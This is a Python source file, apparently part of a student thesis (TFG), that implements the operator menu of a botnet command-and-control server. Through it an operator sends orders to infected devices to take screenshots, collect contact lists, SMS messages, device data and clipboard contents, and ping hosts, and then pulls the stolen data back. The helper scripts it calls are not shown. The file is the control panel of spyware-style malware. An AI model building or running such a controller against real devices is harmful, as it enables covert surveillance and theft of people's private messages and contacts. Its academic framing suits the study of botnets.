# Botmaster para el TFG de Nicolas Cea Porras
# Es necesaria la dependencia firebase admin, instalar con pip3 install firebase-admin
# Pensado para ser utilizado en kali linux pero puede utilizarse solo con python3

import os

################################################ MENU ############################################################
def menu():
    while True:
        mensajeMenu = """Please select an action:\n 
        (1) Send an order to the Botnet
        (2) Get information from the botnet
        (3) See alive bots
        (4) Remove a permanent order
        (5) Exit
        """
        errorSeleccion = "Please use an available integer from the list above\n"
        print(mensajeMenu)

        seleccionMenu = 0
        while True:
            try:
                seleccionMenu = int(input("Option: "))
                if(not(seleccionMenu>=1 and seleccionMenu<=5)):
                    raise Exception
            except:
                print(errorSeleccion)
                continue
            else:
                break
            
        if seleccionMenu == 1:
            seleccionPrimitivas()
            
        if seleccionMenu == 2:
            recuperaData()
            
        if seleccionMenu == 3:
            os.system("python3 botsVivos.py")
        
        if seleccionMenu == 4:
            os.system("python3 eliminaPerma.py")
            
        if seleccionMenu == 5:
            salir()

################################################ RECUPERA DATA ############################################################
def recuperaData():
    print("Please select the information you would like to recover from the botnet:\n")
    while True:
        mensajePrimitivas = """
        (1) get an screenshot
        (2) get the contact list
        (3) get the sms list
        (4) get the device data
        (5) get Clipboard
        (6) go back to menu
        (7) exit
        """
        print(mensajePrimitivas)
        errorSeleccion = "Please use an available integer from the list above\n"
        print(mensajePrimitivas)

        seleccionMenu = 0
        while True:
            try:
                seleccionMenu = int(input("Option: "))
                if(not(seleccionMenu>=1 and seleccionMenu<=7)):
                    raise Exception
            except:
                print(errorSeleccion)
                continue
            else:
                break
            
        if seleccionMenu == 1:
            os.system("python3 getCaptura.py")
        if seleccionMenu == 2:
            os.system("python3 getContacto.py")
        if seleccionMenu == 3:
            os.system("python3 getSms.py")
        if seleccionMenu == 4:
            os.system("python3 getDatosdispositivo.py")
        if seleccionMenu == 5:
            os.system("python3 getClipboard.py")
        if seleccionMenu == 6:
            menu()
        if seleccionMenu == 7:
            salir()

        print("Please select more information to get from the botnet")

################################################ SALIR ############################################################

def salir():
    print('Bye <3\n')
    quit()

################################################ SELECCION PRIMITIVAS ############################################################


def seleccionPrimitivas():
    print("Please select an order for the botnet:\n")
    while True:
        mensajePrimitivas = """
        (1) screenshot
        (2) get contact list
        (3) get sms list
        (4) get device data
        (5) send ping to host
        (6) go back to menu
        (7) exit
        """
        print(mensajePrimitivas)
        errorSeleccion = "Please use an available integer from the list above\n"
        print(mensajePrimitivas)

        seleccionMenu = 0
        while True:
            try:
                seleccionMenu = int(input("Option: "))
                if(not(seleccionMenu>=1 and seleccionMenu<=7)):
                    raise Exception
            except:
                print(errorSeleccion)
                continue
            else:
                break
            
        if seleccionMenu == 1:
            os.system("python3 captura.py")
        if seleccionMenu == 2:
            os.system("python3 contacto.py")
        if seleccionMenu == 3:
            os.system("python3 sms.py")
        if seleccionMenu == 4:
            os.system("python3 datosdispositivo.py")
        if seleccionMenu == 5:
            os.system("python3 ping.py")
        if seleccionMenu == 6:
            menu()
        if seleccionMenu == 7:
            salir()

        print("Please select another order for the botnet")

################################################ MAIN ############################################################

def main():
    mensajeBienvenida = """    ################################################
    #                                              #
    # Bot Master server for Nicolas Cea Porras TFG #
    #                                              #
    ################################################"""

    print(mensajeBienvenida+"\n")
    menu()
    

if __name__ == "__main__":
    main()